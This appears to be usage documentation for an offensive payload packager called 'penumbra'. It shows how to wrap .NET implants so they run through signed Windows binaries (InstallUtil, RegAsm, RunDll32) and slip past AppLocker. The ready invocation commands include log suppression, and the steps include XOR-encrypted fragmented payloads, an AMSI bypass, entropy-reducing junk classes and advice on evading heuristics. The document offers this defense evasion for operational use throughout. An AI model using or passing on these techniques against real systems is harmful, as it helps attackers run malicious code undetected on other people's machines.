# LOLBAS Output Formats

## What is LOLBAS?

LOLBAS (Living Off the Land Binaries and Scripts) refers to legitimate, Microsoft-signed binaries that can be abused for unintended purposes — such as executing arbitrary code. Because these binaries are signed by Microsoft and located in trusted paths like `C:\Windows\`, they are typically allowed by AppLocker policies and are less likely to trigger security alerts.

## Why does this matter?

In environments with AppLocker or similar application whitelisting, arbitrary executables cannot run. However, LOLBAS binaries are trusted by default. By packaging a payload in a format that these binaries can load, an attacker can execute code while appearing to use legitimate system tools.

## Techniques Available

| Format | Binary | Invocation | Output Type |
|--------|--------|-----------|-------------|
| `installutil` | InstallUtil.exe | `/U payload.exe` | `.exe` |
| `regasm` | RegAsm.exe | `/U payload.dll` | `.dll` |
| `rundll32` | RunDll32.exe | `payload.dll,DllMain` | `.dll` |

All three are located in `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\` (InstallUtil, RegAsm) or `C:\Windows\System32\` (RunDll32), which are typically in AppLocker's default allow rules.

### `installutil` — InstallUtil.exe

The payload class inherits `System.Configuration.Install.Installer` with `[RunInstaller(true)]` and overrides `Uninstall()`. When invoked with `/U`, InstallUtil calls the uninstall method, executing the payload.

```bash
penumbra implant.exe --lolbas installutil
# Run: InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

### `regasm` — RegAsm.exe

The payload class is decorated with `[ComVisible(true)]` and `[Guid("...")]`, with a static method marked `[ComUnregisterFunction]`. When invoked with `/U`, RegAsm calls the COM unregister function.

```bash
penumbra implant.exe --lolbas regasm
# Run: RegAsm.exe /U payload.dll
```

### `rundll32` — RunDll32.exe

Uses the `DllExport` NuGet package to create unmanaged exports from a .NET assembly. The exported `DllMain` function contains the payload loader.

```bash
penumbra implant.exe --lolbas rundll32
# Run: rundll32.exe payload.dll,DllMain
```

## How it Works

All three formats follow the same internal pattern:

1. XOR-encrypt the input assembly with a random 32-byte key
2. Fragment the encrypted payload across multiple C# classes
3. Generate 5-8 junk classes for entropy reduction
4. Include HWBP+VEH AMSI bypass
5. At runtime: reassemble fragments, XOR-decrypt, `Assembly.Load()`, invoke EntryPoint
6. Compile as net472 (available on all modern Windows without runtime install)

## Usage

```bash
# InstallUtil format
penumbra implant.exe --lolbas installutil -o payload.exe

# RegAsm format
penumbra implant.exe --lolbas regasm -o payload.dll

# RunDll32 format
penumbra implant.exe --lolbas rundll32 -o payload.dll
```

Penumbra prints an execution hint after generation showing the exact command needed.

## Mutual Exclusivity / Compatibility

- `--lolbas` is mutually exclusive with `--embed` and `--ps1-loader`
- Valid only with .NET IL pipeline input
- The input assembly goes through dotnet-il default passes before being packaged
- All LOLBAS outputs target net472 for maximum compatibility

## Important Notes

- The payload must be placed in an AppLocker-allowed path (e.g., `C:\Windows\Tasks`)
- `/logfile= /LogToConsole=false` suppresses InstallUtil's output logging
- All generated code uses plausible identifier names to avoid obfuscation heuristics
